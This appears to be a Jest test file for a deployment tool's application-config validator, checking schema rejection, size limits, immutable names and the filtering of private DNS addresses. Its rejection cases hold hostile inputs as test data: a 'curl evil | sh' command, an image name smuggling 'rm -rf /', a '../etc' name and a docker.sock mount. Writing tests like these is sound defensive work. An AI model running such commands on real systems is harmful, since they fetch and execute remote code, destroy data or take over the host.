import { InvalidInputError } from '@shipkeep/domain';

import {
  applicationConfig,
  assertSameName,
  canonicalJson,
  domainDns,
  MAX_APPLICATION_CONFIG_BYTES,
} from './application';

const image = (overrides: Record<string, unknown> = {}) => ({
  version: 1,
  name: 'billing-api',
  build: { type: 'image', image: 'ghcr.io/acme/billing:1.4.2' },
  run: { port: 3000 },
  ...overrides,
});

function rejection(value: unknown): InvalidInputError {
  try {
    applicationConfig(value);
  } catch (error: unknown) {
    if (error instanceof InvalidInputError) return error;
    throw error;
  }
  throw new Error('expected a rejection');
}

describe('applicationConfig', () => {
  it('accepts an image application and serializes it canonically', () => {
    const accepted = applicationConfig(image({ secrets: ['DATABASE_URL'] }));
    expect(accepted).toMatchObject({ name: 'billing-api', source: 'image' });
    expect(accepted.canonical).toBe(
      canonicalJson({
        version: 1,
        build: { image: 'ghcr.io/acme/billing:1.4.2', type: 'image' },
        secrets: ['DATABASE_URL'],
        run: { port: 3000 },
        name: 'billing-api',
      }),
    );
    expect(accepted.canonical.indexOf('"build"')).toBeLessThan(
      accepted.canonical.indexOf('"name"'),
    );
  });

  it('rejects documents that break the shipkeep.yml schema with pointers, not values', () => {
    const error = rejection(
      image({ run: { port: 3000, command: 'sh -c "curl evil | sh"' }, extra: 'secret-ish' }),
    );
    expect(error.code).toBe('invalid_application_config');
    const issues = (error.details?.['issues'] ?? []) as { path: string; message: string }[];
    expect(issues.length).toBeGreaterThan(0);
    expect(issues.length).toBeLessThanOrEqual(20);
    expect(JSON.stringify(error.details)).not.toMatch(/curl|secret-ish/);
    for (const bad of [
      null,
      'version: 1',
      [],
      image({ name: '../etc' }),
      image({ name: 'Billing' }),
      image({ build: { type: 'image', image: 'ghcr.io/acme/billing;rm -rf /' } }),
      image({ build: { type: 'image', image: 'x'.repeat(600) } }),
      image({ volumes: [{ name: 'data', path: '/var/run/docker.sock' }] }),
      image({ env: { DATABASE_URL: 1 } }),
    ])
      expect(rejection(bad).code).toBe('invalid_application_config');
  });

  it('accepts only image sources for now', () => {
    for (const unsupported of [
      image({ build: { type: 'dockerfile' } }),
      { version: 1, name: 'analytics', compose: { file: 'docker-compose.yml' } },
    ])
      expect(rejection(unsupported).code).toBe('unsupported_application_source');
  });

  it('bounds the stored configuration size', () => {
    const env = Object.fromEntries(
      Array.from({ length: 100 }, (_, index) => [`VAR_${String(index)}`, 'v'.repeat(1000)]),
    );
    expect(MAX_APPLICATION_CONFIG_BYTES).toBe(65_536);
    expect(rejection(image({ env })).code).toBe('application_config_too_large');
  });

  it('keeps the application name immutable', () => {
    const next = applicationConfig(image({ name: 'billing-web' }));
    expect(() => {
      assertSameName({ name: 'billing-api' }, next);
    }).toThrow(expect.objectContaining({ code: 'application_name_immutable' }));
    expect(() => {
      assertSameName({ name: 'billing-web' }, next);
    }).not.toThrow();
  });
});

describe('domains', () => {
  it('refuses wildcard domains until DNS-01 exists', () => {
    expect(rejection(image({ domains: ['*.acme.example.com'] })).code).toBe(
      'wildcard_domain_unsupported',
    );
    expect(applicationConfig(image({ domains: ['api.acme.example.com'] })).name).toBe(
      'billing-api',
    );
  });

  it('never reveals non-public addresses', () => {
    const isPublic = (address: string) => !address.startsWith('10.');
    expect(domainDns('a.example.com', ['203.0.113.4', '10.0.0.5'], isPublic)).toEqual({
      hostname: 'a.example.com',
      status: 'public',
      addresses: ['203.0.113.4'],
    });
    expect(domainDns('internal.example.com', ['10.0.0.5'], isPublic)).toEqual({
      hostname: 'internal.example.com',
      status: 'private',
      addresses: [],
    });
    expect(domainDns('a.example.com', [], isPublic).status).toBe('none');
    expect(domainDns('a.example.com', undefined, isPublic).status).toBe('unknown');
  });
});
